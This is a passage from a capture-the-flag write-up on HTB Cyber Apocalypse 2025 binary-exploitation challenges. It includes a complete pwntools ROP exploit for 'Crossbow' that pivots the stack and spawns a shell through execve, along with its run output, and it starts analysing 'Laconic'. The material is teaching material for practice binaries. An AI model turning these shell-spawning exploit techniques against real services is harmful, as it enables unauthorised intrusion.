<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 exploit.py local ./blessing
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./blessing&#39;</span>: pid <span style="color:#ae81ff">74709</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">140453500518416</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#34;\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\x08 \x08\n\n\x1b[1;34m[\x1b[1;32mBard\x1b[1;34m]: Now, I want something in return...\n\nHow about a song?\n\nGive me the song&#39;s length: &#34;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;\n\x1b[1;34m[\x1b[1;32mBard\x1b[1;34m]: Excellent! Now tell me the song: &#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Receiving all data: Done <span style="color:#f92672">(</span>27B<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Process <span style="color:#e6db74">&#39;./blessing&#39;</span> stopped with exit code <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>pid 74709<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;HTB{f4k3_fl4g_f0r_t35t1ng}\n&#39;</span>
</span></span></code></pre></div><h2 id="pwn---crossbow">PWN - Crossbow<a href="#pwn---crossbow" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<h3 id="enumeration-2">Enumeration<a href="#enumeration-2" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Binary is statically linked and not stripped. It has following security mechanisms enabled:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>checksec crossbow
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:      Canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span><span style="display:flex;"><span>    Debuginfo:  Yes
</span></span></code></pre></div><h3 id="analysis-3">Analysis<a href="#analysis-3" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>When we open the binary in IDA, we notice the <code>main()</code> function simply calls <code>training()</code>, which will allocates a stack buffer and finally call <code>target_dummy(stack_buffer)</code>. The later works as the following, it request an integer value from the user (the <code>target</code>) and then offset the argument stack buffer using <code>target</code> to store it a heap allocated pointer. Finally, it reads <strong>128</strong> bytes from the user and stores them in this heap buffer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">target_dummy</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>input)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// r8d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// r9d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// edx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// ecx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// r8d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// r9d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v7; <span style="color:#75715e">// r8d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v8; <span style="color:#75715e">// r9d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ptr; <span style="color:#75715e">// rbx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v10; <span style="color:#75715e">// r8d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v11; <span style="color:#75715e">// r9d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> result; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v13; <span style="color:#75715e">// r8d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v14; <span style="color:#75715e">// r9d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> target; <span style="color:#75715e">// [rsp+1Ch] [rbp-14h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[%sSir Alaric%s]: Select target to shoot: &#34;</span>,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;34m&#34;</span>,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;33m&#34;</span>,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;34m&#34;</span>,
</span></span><span style="display:flex;"><span>    v1,
</span></span><span style="display:flex;"><span>    v2);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">scanf</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;%d%*c&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>target, v3, v4, v5, v6) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(
</span></span><span style="display:flex;"><span>      (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[%sSir Alaric%s]: Are you aiming for the birds or the target kid?!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>      (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;31m&#34;</span>,
</span></span><span style="display:flex;"><span>      (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;33m&#34;</span>,
</span></span><span style="display:flex;"><span>      (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;31m&#34;</span>,
</span></span><span style="display:flex;"><span>      v7,
</span></span><span style="display:flex;"><span>      v8);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1312LL</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  ptr <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>input[<span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> target];
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)ptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">calloc</span>(<span style="color:#ae81ff">1LL</span>, <span style="color:#ae81ff">0x80LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!*</span>(_QWORD <span style="color:#f92672">*</span>)ptr )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(
</span></span><span style="display:flex;"><span>      (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[%sSir Alaric%s]: We do not want cowards here!!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>      (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;31m&#34;</span>,
</span></span><span style="display:flex;"><span>      (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;33m&#34;</span>,
</span></span><span style="display:flex;"><span>      (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;31m&#34;</span>,
</span></span><span style="display:flex;"><span>      v10,
</span></span><span style="display:flex;"><span>      v11);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">6969LL</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[%sSir Alaric%s]: Give me your best warcry!!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; &#34;</span>,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;34m&#34;</span>,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;33m&#34;</span>,
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;34m&#34;</span>,
</span></span><span style="display:flex;"><span>    v10,
</span></span><span style="display:flex;"><span>    v11);
</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> <span style="color:#a6e22e">fgets_unlocked</span>(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>input[<span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> target], <span style="color:#ae81ff">128LL</span>, <span style="color:#f92672">&amp;</span>stdin_FILE);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>result )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(
</span></span><span style="display:flex;"><span>      (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[%sSir Alaric%s]: Is this the best you have?!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>      (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;31m&#34;</span>,
</span></span><span style="display:flex;"><span>      (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;33m&#34;</span>,
</span></span><span style="display:flex;"><span>      (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;31m&#34;</span>,
</span></span><span style="display:flex;"><span>      v13,
</span></span><span style="display:flex;"><span>      v14);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">69LL</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>There is important things to notice here in order to unveil the exploitation path:</p>
<ul>
<li><code>target</code> is <strong>not checked</strong>, it can be supply a value that overflow the stack buffer and override stack control flow values</li>
<li><code>target</code> is a <strong>signed integer</strong>, allowing us to offset the stack buffer negatively (and corrupt upper stack frames)</li>
<li>the heap memory at <code>ptr</code> is <strong>not executable</strong>, thus we cannot simply override return address with this pointer</li>
<li>the <code>training</code> and <code>target_dummy</code> functions uses stack cleaning instruction <code>leave</code> which is equivalent to <code>mov rsp, rbp; pop rbp;</code>
<ul>
<li>this could allow us corrupting these 2 registers</li>
</ul>
</li>
</ul>
<h3 id="exploitation-2">Exploitation<a href="#exploitation-2" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>The idea for exploiting this program is the following:</p>
<ol>
<li>supply a <code>target</code> that would make the heap allocated pointer land on the location where <code>RBP</code> is stored in current stack frame (<code>target_dummy</code>)</li>
<li>supply a ROPchain in the heap memory for spawning <code>execve(&quot;/bin/sh&quot;, 0, 0)</code></li>
<li><code>target_dummy</code> return and corrupt <code>RBP</code> (now points to heap location at <code>ptr</code>)</li>
<li><code>training</code> return and corrupt <code>RSP</code> (same)</li>
<li>The program returns from the value at <code>RSP</code></li>
</ol>
<p>The ROPchain for spawning the shell does the following:</p>
<ol>
<li>write <code>&quot;/bin/sh\0&quot;</code> to a writable location in the binary (possible because non PIE)</li>
<li>craft arguments to <code>execve</code> (<code>rdi=@binsh</code>, <code>rsi=0</code>, <code>rdx=0</code>)</li>
<li>make a syscall</li>
</ol>
<p>Chaining this together, we build the following exploit code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> binascii
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>endian <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;little&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    subparsers <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>add_subparsers(dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;command&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser_local <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;local&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser_remote <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;remote&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_remote<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;host&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_remote<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;port&#39;</span>, type<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-b&#39;</span>, <span style="color:#e6db74">&#39;--binary&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;local binary path&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;local&#39;</span>:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> process(args<span style="color:#f92672">.</span>binary)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>print_help()
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    binary <span style="color:#f92672">=</span> ELF(args<span style="color:#f92672">.</span>binary)
</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> ROP(binary)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># craft a ropchain that holds &#34;/bin/sh\0&#34;,</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># and will call execve(&#34;/bin/sh&#34;)</span>
</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> ROP(binary)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    g_pop_rdi <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#34;pop rdi&#34;</span>, <span style="color:#e6db74">&#34;ret&#34;</span>])<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>    g_pop_rsi <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#34;pop rsi&#34;</span>, <span style="color:#e6db74">&#34;ret&#34;</span>])<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>    g_pop_rdx <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#34;pop rdx&#34;</span>, <span style="color:#e6db74">&#34;ret&#34;</span>])<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>    g_pop_rax <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#34;pop rax&#34;</span>, <span style="color:#e6db74">&#34;ret&#34;</span>])<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>    g_syscall <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#34;syscall&#34;</span>, <span style="color:#e6db74">&#34;ret&#34;</span>])<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>    g_mov_prdi_rax<span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4020f5</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] Gadgets:&#39;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[-] @g_pop_rdi       :&#39;</span>, hex(g_pop_rdi))
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[-] @g_pop_rsi       :&#39;</span>, hex(g_pop_rsi))
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[-] @g_pop_rdx       :&#39;</span>, hex(g_pop_rdx))
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[-] @g_pop_rax       :&#39;</span>, hex(g_pop_rax))
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[-] @g_syscall       :&#39;</span>, hex(g_syscall))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    writable_ea <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40E298</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    binsh_packed <span style="color:#f92672">=</span> bytes(list(reversed(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> flat(
</span></span><span style="display:flex;"><span>        p64(<span style="color:#ae81ff">0xdeadbeef</span>),
</span></span><span style="display:flex;"><span>        p64(g_pop_rax), <span style="color:#75715e"># rbp/rsp points here at the beginning</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        p64(g_pop_rdi),
</span></span><span style="display:flex;"><span>        p64(writable_ea),
</span></span><span style="display:flex;"><span>        p64(g_mov_prdi_rax),
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># execve ropchain</span>
</span></span><span style="display:flex;"><span>        p64(g_pop_rsi),
</span></span><span style="display:flex;"><span>        p64(<span style="color:#ae81ff">0</span>),
</span></span><span style="display:flex;"><span>        p64(g_pop_rdx),
</span></span><span style="display:flex;"><span>        p64(<span style="color:#ae81ff">0</span>),
</span></span><span style="display:flex;"><span>        p64(g_pop_rax),
</span></span><span style="display:flex;"><span>        p64(<span style="color:#ae81ff">0x3b</span>),
</span></span><span style="display:flex;"><span>        p64(g_syscall),
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    off_to_rbp_ptr <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    input(<span style="color:#e6db74">&#39;type enter to exploit&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;target to shoot: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(off_to_rbp_ptr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    input(<span style="color:#e6db74">&#39;type enter to continue&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Running it allows us to get the flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 exploit.py -b ./crossbow local
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./crossbow&#39;</span>: pid <span style="color:#ae81ff">132625</span>
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:      Canary found
</span></span><span style="display:flex;"><span>    NX:         NX enabled
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span><span style="display:flex;"><span>    Debuginfo:  Yes
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Loaded <span style="color:#ae81ff">57</span> cached gadgets <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;./crossbow&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Gadgets:
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> @g_pop_rdi       : 0x401d6c
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> @g_pop_rsi       : 0x40566b
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> @g_pop_rdx       : 0x401139
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> @g_pop_rax       : 0x401001
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> @g_syscall       : 0x404b51
</span></span><span style="display:flex;"><span>type enter to exploit
</span></span><span style="display:flex;"><span>type enter to <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Sir Alaric<span style="color:#f92672">]</span>: Give me your best warcry!!
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&gt; 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Sir Alaric<span style="color:#f92672">]</span>: That was quite a shot!!
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ cat flag.txt
</span></span><span style="display:flex;"><span>HTB<span style="color:#f92672">{</span>f4k3_fl4g_f0r_t35t1ng<span style="color:#f92672">}</span>
</span></span></code></pre></div><h2 id="pwn---laconic">PWN - Laconic<a href="#pwn---laconic" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<h3 id="enumeration-3">Enumeration<a href="#enumeration-3" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Th binary is statically linked, and not stripped. The binary in itself has no security protections:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>checksec laconic
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      No RELRO
</span></span><span style="display:flex;"><span>    Stack:      No canary found
</span></span><span style="display:flex;"><span>    NX:         NX unknown - GNU_STACK missing
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x42000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    Stack:      Executable
</span></span><span style="display:flex;"><span>    RWX:        Has RWX segments
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span></code></pre></div><h3 id="analysis-4">Analysis<a href="#analysis-4" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>When reversing the binary in IDA, we notice a very simple logic. The program just makes a <code>sys_read(0, rsp-8, 0x106)</code>.</p>
<p>This effectively provide us with a direct buffer overflow onto the stack, but as the program doesn&rsquo;t hold interesting functions or gadgets nor load interesting libraries, we can&rsquo;t simply ROP or ret2win. We will have to design a proper exploit that deal with the program restrictions (limited read size, low gadgets).</p>
<p><img alt="disass laconic" src="/img/ctf-htb-cyberapo2025/laconic-disass.png"></p>
<h3 id="exploitation-3">Exploitation<a href="#exploitation-3" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>What we notice is that the program actually gives us one interesting gadget we show in the disassembly view above (the <code>pop rax; ret</code>). This gadget grant us with the possibility to specify a syscall to make when calling the <code>syscall; retn;</code> gadget.</p>
